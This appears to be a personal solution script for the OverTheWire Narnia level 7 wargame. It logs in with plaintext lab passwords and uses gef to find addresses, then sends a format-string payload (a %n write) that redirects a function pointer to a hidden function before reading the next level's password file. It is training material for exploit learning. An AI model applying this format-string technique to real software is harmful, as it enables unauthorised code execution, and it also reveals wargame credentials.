sftp -oPort=2226 narnia7@narnia.labs.overthewire.org
54RtepCEU0
get /narnia/narnia7
get /narnia/narnia7.c
exit

sshpass -p '54RtepCEU0' ssh narnia7@narnia.labs.overthewire.org -p 2226
cd /narnia

gef ./narnia7
run test
# run the program get address of hackedfunction and ptrf
# hackedfunction is at 0x804930f -> 134517519
# ptrf is at 0xffffd308
# let ptrf point to hackedfunction
run $(python3 -c "import sys, struct; sys.stdout.buffer.write(struct.pack('<I', 0xffffd308) + b'%134517515u%n')")
# change the address and run again
# ptrf is at 0xffffd2f8
run $(python3 -c "import sys, struct; sys.stdout.buffer.write(struct.pack('<I', 0xffffd2f8) + b'%134517515u%n')")
quit

# test run
./narnia7 $(python3 -c "import sys, struct; sys.stdout.buffer.write(struct.pack('<I', 0xffffd2f8) + b'%134517515u%n')")
# hackedfunction is at 0x804930f -> 134517519
# ptrf is at 0xffffd328
./narnia7 $(python3 -c "import sys, struct; sys.stdout.buffer.write(struct.pack('<I', 0xffffd328) + b'%134517515u%n')")

cat /etc/narnia_pass/narnia8
# Password: i1SQ81fkb8